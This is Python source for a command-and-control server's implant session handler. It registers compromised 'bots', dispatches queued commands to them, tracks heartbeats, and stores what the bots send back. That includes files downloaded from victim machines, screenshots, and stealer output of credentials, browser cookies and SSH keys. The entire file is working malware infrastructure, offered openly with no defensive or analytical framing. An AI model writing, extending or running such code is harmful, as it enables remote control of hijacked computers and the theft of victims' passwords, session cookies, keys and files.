"""Client session handler for implant connections."""

import json
import logging
import time
import uuid

from .protocol import read_packet, write_packet
from .registry import ClientConnection, Registry
from .storage import (
    get_command,
    get_pending_commands,
    mark_command_completed,
    mark_command_dispatched,
    save_download,
    save_response,
    save_screenshot,
    save_stealer_result,
    set_bot_disconnected,
    update_bot_heartbeat,
    upsert_bot,
)

logger = logging.getLogger(__name__)


def build_command_packet(cmd: dict) -> dict:
    """Build a command packet from a stored command record."""
    args = cmd.get("args", "{}")
    if isinstance(args, str):
        try:
            args = json.loads(args)
        except json.JSONDecodeError:
            args = {}
    return {
        "id": cmd["id"],
        "seq": 0,
        "timestamp": int(time.time()),
        "type": "command",
        "data": {"command_type": cmd["command_type"], "args": args},
    }


async def handle_client_session(reader, writer, crypto, addr, registry: Registry, event_bus=None):
    """
    Handle a single implant connection session.

    This function:
    1. Receives and validates the checkin packet
    2. Registers the bot in the registry and database
    3. Dispatches any pending commands
    4. Enters the heartbeat/response loop
    5. Handles file extraction for download/screenshot responses
    6. Emits events for WebSocket broadcasting
    """
    from .api.events import Event, EventType

    # Get client IP
    client_ip = addr[0] if addr else None

    # Read checkin packet
    packet = await read_packet(reader, crypto)
    if packet.get("type") != "checkin":
        logger.warning(f"Expected checkin from {addr}, got {packet.get('type')}")
        return

    data = packet.get("data", {})
    hwid = data.get("hwid", "unknown")
    session_id = str(uuid.uuid4())

    # Create connection and register
    conn = ClientConnection(hwid, addr, reader, writer, crypto)
    conn.session_id = session_id
    conn.info = data
    conn.last_heartbeat = int(time.time())
    await registry.register(conn)
    await upsert_bot(data, client_ip=client_ip)

    logger.info(
        f"Bot registered: {data.get('hostname')} | {data.get('os')} | "
        f"{data.get('username')} | HWID={hwid[:16]}..."
    )

    # Emit bot connected event
    if event_bus:
        await event_bus.publish(
            Event(
                EventType.BOT_CONNECTED,
                {
                    "hwid": hwid,
                    "hostname": data.get("hostname"),
                    "os": data.get("os"),
                    "username": data.get("username"),
                    "privileges": data.get("privileges"),
                },
            )
        )

    # Dispatch pending commands
    pending = await get_pending_commands(hwid)
    for cmd in pending:
        try:
            pkt = build_command_packet(cmd)
            await write_packet(writer, crypto, pkt)
            await mark_command_dispatched(cmd["id"])
            logger.info(f"Dispatched pending command {cmd['id'][:8]} to {hwid[:16]}")
            if event_bus:
                await event_bus.publish(
                    Event(
                        EventType.COMMAND_DISPATCHED,
                        {"command_id": cmd["id"], "hwid": hwid, "command_type": cmd["command_type"]},
                    )
                )
        except Exception as e:
            logger.error(f"Failed to dispatch pending command {cmd['id'][:8]}: {e}")

    # Send checkin acknowledgment
    ack = {
        "id": str(uuid.uuid4()),
        "seq": 0,
        "timestamp": int(time.time()),
        "type": "checkin_ack",
        "data": {"session_id": session_id, "heartbeat_interval": 30},
    }
    await write_packet(writer, crypto, ack)

    try:
        while True:
            packet = await read_packet(reader, crypto)
            ptype = packet.get("type", "")

            if ptype == "heartbeat":
                conn.last_heartbeat = int(time.time())
                await update_bot_heartbeat(hwid)
                if event_bus:
                    await event_bus.publish(
                        Event(EventType.BOT_HEARTBEAT, {"hwid": hwid, "timestamp": conn.last_heartbeat})
                    )

            elif ptype == "response":
                await handle_response(packet, hwid, event_bus)

            elif ptype == "error":
                err = packet.get("data", {})
                logger.warning(f"Error from {hwid[:16]}: {err.get('message', '')}")

            else:
                logger.warning(f"Unknown packet type from {hwid[:16]}: {ptype}")

    except Exception as e:
        logger.info(f"Client {hwid[:16]} disconnected: {e}")
    finally:
        await registry.unregister(hwid)
        await set_bot_disconnected(hwid)
        if event_bus:
            await event_bus.publish(Event(EventType.BOT_DISCONNECTED, {"hwid": hwid}))


async def handle_response(packet: dict, hwid: str, event_bus=None):
    """Handle a response packet from an implant."""
    from .api.events import Event, EventType
    from .api.files import extract_download, extract_screenshot

    resp_data = packet.get("data", {})
    cmd_id = resp_data.get("command_id", "")
    status = resp_data.get("status", "")
    output = resp_data.get("data", resp_data.get("output", ""))

    # Get command info to determine type
    cmd_info = await get_command(cmd_id) if cmd_id else None
    command_type = cmd_info["command_type"] if cmd_info else None

    # Handle file extraction for downloads and screenshots
    extracted = None
    if command_type == "file_download" and isinstance(output, dict) and "data_b64" in output:
        extracted = await extract_download(output, cmd_id, hwid)
        if extracted:
            await save_download(
                extracted["id"],
                extracted["bot_hwid"],
                extracted["command_id"],
                extracted["remote_path"],
                extracted["local_path"],
                extracted["filename"],
                extracted["size"],
                extracted["sha256"],
            )
            if event_bus:
                await event_bus.publish(Event(EventType.FILE_EXTRACTED, extracted))
            # Remove data_b64 from output before storing in responses table
            output = {k: v for k, v in output.items() if k != "data_b64"}
            output["extracted_id"] = extracted["id"]

    elif command_type == "screenshot" and isinstance(output, dict) and "data_b64" in output:
        extracted = await extract_screenshot(output, cmd_id, hwid)
        if extracted:
            await save_screenshot(
                extracted["id"],
                extracted["bot_hwid"],
                extracted["command_id"],
                extracted["local_path"],
                extracted["thumbnail_path"],
                extracted["format"],
                extracted["size"],
                extracted.get("width"),
                extracted.get("height"),
            )
            if event_bus:
                await event_bus.publish(Event(EventType.SCREENSHOT_EXTRACTED, extracted))
            # Remove data_b64 from output before storing
            output = {k: v for k, v in output.items() if k != "data_b64"}
            output["extracted_id"] = extracted["id"]

    elif command_type == "steal":
        if not isinstance(output, dict):
            logger.warning(
                f"steal response from {hwid[:16]}: expected dict output, got {type(output).__name__}. "
                f"Data: {str(output)[:200]}"
            )
        else:
            result_id = str(uuid.uuid4())
            await save_stealer_result(
                result_id=result_id,
                bot_hwid=hwid,
                command_id=cmd_id,
                credentials=output.get("credentials", []),
                cookies=output.get("cookies", []),
                ssh_keys=output.get("ssh_keys", []),
                errors=output.get("errors", []),
                collection_time_ms=output.get("collection_time_ms"),
            )
            if event_bus:
                await event_bus.publish(
                    Event(
                        EventType.STEAL_COMPLETED,
                        {
                            "hwid": hwid,
                            "result_id": result_id,
                            "credential_count": len(output.get("credentials", [])),
                            "error_count": len(output.get("errors", [])),
                        },
                    )
                )
            output = {
                "result_id": result_id,
                "credential_count": len(output.get("credentials", [])),
            }

    # Save response to database
    output_str = json.dumps(output) if isinstance(output, dict) else str(output)
    await save_response(packet["id"], cmd_id, status, output_str)

    # Mark command as completed
    if cmd_id:
        await mark_command_completed(cmd_id, success=(status == "success"))

    logger.info(f"Response from {hwid[:16]}: [{status}] {output_str[:200]}")

    # Emit response event
    if event_bus:
        await event_bus.publish(
            Event(
                EventType.RESPONSE_RECEIVED,
                {
                    "command_id": cmd_id,
                    "hwid": hwid,
                    "status": status,
                    "command_type": command_type,
                    "has_file": extracted is not None,
                },
            )
        )
